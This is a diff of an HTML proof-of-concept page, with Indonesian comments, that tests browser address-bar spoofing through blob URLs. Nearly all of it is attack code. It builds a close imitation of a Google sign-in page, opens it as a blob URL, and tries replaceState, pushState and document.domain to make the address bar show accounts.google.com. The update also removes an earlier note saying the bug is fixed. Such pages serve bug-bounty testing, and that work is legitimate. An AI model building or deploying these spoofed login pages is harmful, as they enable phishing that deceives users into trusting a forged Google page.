@@ -3,43 +3,40 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>UI Spoofing PoC - Blob URL Address Bar</title>
+<title>Blob URL UI Spoofing PoC</title>
 <style>
-  body { font-family: 'Segoe UI', Arial, sans-serif; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
-  h1 { color: #fff; border-bottom: 2px solid #444; padding-bottom: 10px; }
-  .panel { background: #2d2d2d; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
-  button { padding: 12px 24px; background: #0e639c; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; margin: 5px; }
-  button:hover { background: #1177bb; }
-  #log { background: #000; padding: 15px; border-radius: 6px; height: 350px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; font-size: 12px; border: 1px solid #333; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 30px; margin: 0; }
+  h1 { color: #ff6b6b; border-bottom: 2px solid #ff6b6b; padding-bottom: 10px; }
+  .panel { background: #16213e; padding: 25px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #0f3460; }
+  button { padding: 14px 28px; background: #e94560; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 15px; font-weight: bold; margin: 5px; transition: background 0.2s; }
+  button:hover { background: #c73650; }
+  #log { background: #0a0a15; padding: 15px; border-radius: 6px; height: 350px; overflow-y: auto; white-space: pre-wrap; font-family: 'Courier New', monospace; font-size: 12px; border: 1px solid #0f3460; }
   .success { color: #4caf50; font-weight: bold; }
   .error { color: #f44336; font-weight: bold; }
   .info { color: #2196f3; }
-  .warn { color: #ff9800; }
-  iframe { width: 100%; height: 200px; border: 2px solid #555; margin-top: 20px; border-radius: 6px; background: #fff; }
+  .warn { color: #ff9800; font-weight: bold; }
 </style>
 </head>
 <body>
 
-<h1>🕵️ UI Spoofing PoC — Blob URL & History Manipulation</h1>
+<h1>🕵️ Blob URL UI Spoofing PoC</h1>
 
 <div class="panel">
-  <p style="color:#aaa; margin-top:0;">Pilih metode di bawah. Setiap metode akan mencoba memanipulasi address bar atau membuat window dengan URL yang terlihat tepercaya.</p>
-  <button id="btn1">1. History pushState (Blob Prefix)</button>
-  <button id="btn2">2. Window.open dengan Blob URL Palsu</button>
-  <button id="btn3">3. document.domain + Blob</button>
-  <button id="btn4">4. ReplaceState ke Google Blob</button>
-  <button id="clear" style="background:#c62828;">Bersihkan Log</button>
+  <p style="color:#aaa; margin-top:0;">
+    Klik tombol di bawah untuk membuka halaman login Google palsu di tab baru. Perhatikan address bar pada tab tersebut.
+  </p>
+  <button id="btnSpoof">🎭 Buka Halaman Palsu</button>
+  <button id="btnCheck">🔍 Cek Address Bar Saat Ini</button>
+  <button id="clear" style="background:#555;">Bersihkan Log</button>
 </div>
 
 <div id="log">Menunggu perintah...</div>
-<div id="frameContainer"></div>
 
 <script>
 (function() {
   'use strict';
 
   const logEl = document.getElementById('log');
-  const frameContainer = document.getElementById('frameContainer');
 
   function log(msg, type = '') {
     const time = new Date().toISOString().substr(11, 8);
@@ -52,180 +49,140 @@
     console.log(msg);
   }
 
-  function clearAll() {
-    logEl.textContent = '';
-    frameContainer.innerHTML = '';
-  }
-
   // ============================================
-  // METODE 1: History pushState dengan prefix Blob
+  // KONTEN HALAMAN PALSU (Google Login)
   // ============================================
-  document.getElementById('btn1').onclick = () => {
-    log('=== METODE 1: History pushState (Blob Prefix) ===', 'info');
-    clearAll();
-
-    // URL yang ingin ditampilkan di address bar (terlihat seperti milik Google)
-    const fakeUrl = 'blob:https://accounts.google.com/1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d';
-
-    try {
-      // Manipulasi history
-      history.pushState({ spoof: true }, 'Google Account', fakeUrl);
-      log('✅ pushState berhasil. Address bar seharusnya menampilkan:', 'success');
-      log('   ' + fakeUrl, 'success');
-      log('   (Cek address bar browser kamu sekarang)', 'info');
-
-      // Coba juga replaceState
-      history.replaceState({ spoof: true }, 'Google Account', fakeUrl);
-      log('✅ replaceState berhasil juga.', 'info');
-
-    } catch (e) {
-      log('❌ Gagal manipulasi history: ' + e.name + ' - ' + e.message, 'error');
-      log('   (Ini expected behavior di browser modern untuk origin lintas domain)', 'warn');
-    }
-  };
-
-  // ============================================
-  // METODE 2: Window.open dengan Blob URL Palsu
-  // ============================================
-  document.getElementById('btn2').onclick = () => {
-    log('=== METODE 2: Window.open + Blob URL Palsu ===', 'info');
-
-    // Buat konten yang meniru halaman login Google
-    const fakeHtml = `
-      <!DOCTYPE html>
-      <html>
-      <head>
-        <meta charset="UTF-8">
-        <title>Google Account</title>
-        <style>
-          body { font-family: 'Segoe UI', Arial, sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-          .card { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 400px; }
-          .logo { font-size: 48px; color: #4285f4; font-weight: bold; margin-bottom: 10px; }
-          h2 { color: #202124; margin-bottom: 20px; }
-          input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 15px; font-size: 16px; box-sizing: border-box; }
-          button { width: 100%; padding: 12px; background: #4285f4; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
-          .note { font-size: 12px; color: #999; margin-top: 20px; }
-        </style>
-      </head>
-      <body>
-        <div class="card">
-          <div class="logo">G</div>
-          <h2>Google Account</h2>
-          <p style="color:#666; margin-bottom:20px;">Sign in to continue to Gmail</p>
-          <input type="email" placeholder="Email or phone" />
-          <button>Next</button>
-          <div class="note">This is a UI Spoofing PoC — not a real Google page</div>
+  const fakeGoogleLogin = `
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Sign in - Google Accounts</title>
+      <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+          font-family: 'Google Sans', Roboto, Arial, sans-serif;
+          background: #f0f4f9;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          min-height: 100vh;
+        }
+        .login-card {
+          background: #fff;
+          padding: 48px 40px 36px;
+          border-radius: 8px;
+          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+          width: 100%;
+          max-width: 450px;
+          text-align: center;
+        }
+        .google-logo {
+          font-size: 24px;
+          font-weight: 500;
+          color: #202124;
+          margin-bottom: 8px;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          gap: 8px;
+        }
+        .g-icon {
+          width: 32px;
+          height: 32px;
+          background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="%23EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="%234285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="%23FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="%2334A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>') no-repeat center;
+          background-size: contain;
+        }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 10px; }
+        p.subtitle { font-size: 16px; color: #202124; margin-bottom: 30px; }
+        input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 20px; outline: none; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .btn-row { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
+        .btn-create { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; background: none; border: none; padding: 8px; }
+        .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .btn-next:hover { background: #1765cc; }
+        .footer { margin-top: 40px; font-size: 12px; color: #5f6368; }
+      </style>
+    </head>
+    <body>
+      <div class="login-card">
+        <div class="google-logo"><div class="g-icon"></div><span>Sign in with Google</span></div>
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Gmail</p>
+        <input type="email" placeholder="Email or phone" autofocus />
+        <div class="btn-row">
+          <button class="btn-create">Create account</button>
+          <button class="btn-next">Next</button>
         </div>
-        <script>
-          // Manipulasi history di window baru
-          try {
-            history.replaceState({}, 'Google Account', 'blob:https://accounts.google.com/fake-uuid');
-          } catch(e) {}
-        <\/script>
-      </body>
-      </html>
-    `;
+        <div class="footer">This is a UI Spoofing PoC — not a real Google page.</div>
+      </div>
+      <script>
+        (function() {
+          var fakeBlob = 'blob:https://accounts.google.com/1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d';
+          try { history.replaceState({ spoof: true }, 'Sign in - Google Accounts', fakeBlob); window.parent.postMessage({ status: 'replaceState_success', url: fakeBlob }, '*'); }
+          catch (e) { window.parent.postMessage({ status: 'replaceState_fail', error: e.name + ': ' + e.message }, '*'); }
+          try { history.pushState({ spoof: true }, 'Sign in - Google Accounts', fakeBlob); window.parent.postMessage({ status: 'pushState_success', url: fakeBlob }, '*'); }
+          catch (e) { window.parent.postMessage({ status: 'pushState_fail', error: e.name + ': ' + e.message }, '*'); }
+          try { document.domain = 'google.com'; window.parent.postMessage({ status: 'domain_success' }, '*'); }
+          catch (e) { window.parent.postMessage({ status: 'domain_fail', error: e.message }, '*'); }
+          setTimeout(function() { window.parent.postMessage({ status: 'final', href: window.location.href, origin: window.location.origin }, '*'); }, 500);
+        })();
+      <\/script>
+    </body>
+    </html>
+  `;
 
-    const blob = new Blob([fakeHtml], { type: 'text/html' });
+  // ============================================
+  // BUKA HALAMAN PALSU
+  // ============================================
+  document.getElementById('btnSpoof').onclick = () => {
+    log('=== MEMBUKA HALAMAN PALSU (BLOB UI SPOOFING) ===', 'info');
+    const blob = new Blob([fakeGoogleLogin], { type: 'text/html' });
     const url = URL.createObjectURL(blob);
-
-    log('Membuka window baru dengan Blob URL...', 'info');
     log('Blob URL: ' + url, 'info');
-
     const win = window.open(url, '_blank');
     if (!win) {
       log('❌ Popup diblokir. Izinkan popup untuk melanjutkan.', 'error');
       return;
     }
-
-    log('✅ Window dibuka. Perhatikan address bar:', 'success');
-    log('   - Browser modern akan menampilkan URL asli (blob:https://artha231.github.io/...)', 'info');
-    log('   - Jika address bar menampilkan "blob:https://accounts.google.com/...", itu BUG.', 'warn');
-
-    // Cleanup after 30s
-    setTimeout(() => URL.revokeObjectURL(url), 30000);
-  };
-
-  // ============================================
-  // METODE 3: document.domain + Blob
-  // ============================================
-  document.getElementById('btn3').onclick = () => {
-    log('=== METODE 3: document.domain + Blob ===', 'info');
-
-    try {
-      // Coba ubah document.domain (biasanya gagal di browser modern)
-      document.domain = 'google.com';
-      log('document.domain = "google.com" berhasil?', 'success');
-    } catch (e) {
-      log('❌ Gagal mengubah document.domain: ' + e.name + ' - ' + e.message, 'error');
-    }
-
-    // Buat iframe dengan origin palsu
-    const iframe = document.createElement('iframe');
-    iframe.srcdoc = `
-      <h2>Fake Google Frame</h2>
-      <p>Origin: <span id="o"></span></p>
-      <script>
-        document.getElementById('o').textContent = location.origin;
-        try {
-          document.domain = 'google.com';
-          parent.postMessage('domain_set', '*');
-        } catch(e) {
-          parent.postMessage('domain_fail: ' + e.message, '*');
-        }
-      <\/script>
-    `;
-    frameContainer.appendChild(iframe);
+    log('✅ Tab baru terbuka. Perhatikan ADDRESS BAR di tab tersebut:', 'success');
+    log('   • blob:https://artha231.github.io/... → AMAN (expected)', 'warn');
+    log('   • blob:https://accounts.google.com/... → BUG (UI Spoofing!)', 'success');
 
     window.addEventListener('message', (e) => {
-      log('Pesan dari iframe: ' + e.data, e.data === 'domain_set' ? 'success' : 'warn');
-    }, { once: true });
-  };
-
-  // ============================================
-  // METODE 4: ReplaceState ke Google Blob
-  // ============================================
-  document.getElementById('btn4').onclick = () => {
-    log('=== METODE 4: ReplaceState ke Google Blob ===', 'info');
-
-    const googleBlobUrl = 'blob:https://accounts.google.com/550e8400-e29b-41d4-a716-446655440000';
-
-    try {
-      history.replaceState(null, '', googleBlobUrl);
-      log('✅ replaceState berhasil. Address bar seharusnya menampilkan:', 'success');
-      log('   ' + googleBlobUrl, 'success');
-      log('   (Cek address bar — jika berubah, ini BUG!)', 'warn');
-    } catch (e) {
-      log('❌ Gagal replaceState: ' + e.name, 'error');
-      log('   Pesan: ' + e.message, 'error');
-    }
-
-    // Coba juga pushState dengan URL Blob dari origin berbeda
-    setTimeout(() => {
-      try {
-        history.pushState({}, '', 'blob:https://mail.google.com/fake');
-        log('pushState ke mail.google.com juga dicoba.', 'info');
-      } catch (e) {
-        log('❌ pushState juga gagal: ' + e.name, 'error');
+      if (!e.data || !e.data.status) return;
+      switch (e.data.status) {
+        case 'replaceState_success': log('🎯 replaceState BERHASIL ke: ' + e.data.url, 'success'); break;
+        case 'replaceState_fail': log('❌ replaceState gagal: ' + e.data.error, 'error'); break;
+        case 'pushState_success': log('🎯 pushState BERHASIL ke: ' + e.data.url, 'success'); break;
+        case 'pushState_fail': log('❌ pushState gagal: ' + e.data.error, 'error'); break;
+        case 'domain_success': log('🎯 document.domain berhasil diubah!', 'success'); break;
+        case 'domain_fail': log('❌ document.domain gagal: ' + e.data.error, 'error'); break;
+        case 'final': log('📋 Final href: ' + e.data.href, 'info'); log('📋 Final origin: ' + e.data.origin, 'info'); break;
       }
-    }, 1000);
+    });
+
+    setTimeout(() => URL.revokeObjectURL(url), 60000);
   };
 
   // ============================================
-  // CLEAR LOG
+  // CEK ADDRESS BAR
   // ============================================
+  document.getElementById('btnCheck').onclick = () => {
+    log('=== CEK ADDRESS BAR ===', 'info');
+    log('href: ' + window.location.href, 'info');
+    log('origin: ' + window.location.origin, 'info');
+    log('document.domain: ' + document.domain, 'info');
+    log('history.length: ' + history.length, 'info');
+  };
+
   document.getElementById('clear').onclick = () => {
-    clearAll();
+    logEl.textContent = '';
     log('Log dibersihkan.', 'info');
   };
 
-  // ============================================
-  // INIT
-  // ============================================
-  log('UI Spoofing PoC siap. Pilih metode di atas.', 'info');
-  log('⚠️ PERINGATAN: Bug ini sudah DIPERBAIKI di browser modern.', 'warn');
-  log('   Gunakan hanya untuk edukasi bug bounty.', 'info');
-
+  log('PoC siap. Klik "Buka Halaman Palsu" untuk memulai.', 'info');
 })();
 </script>
 </body>
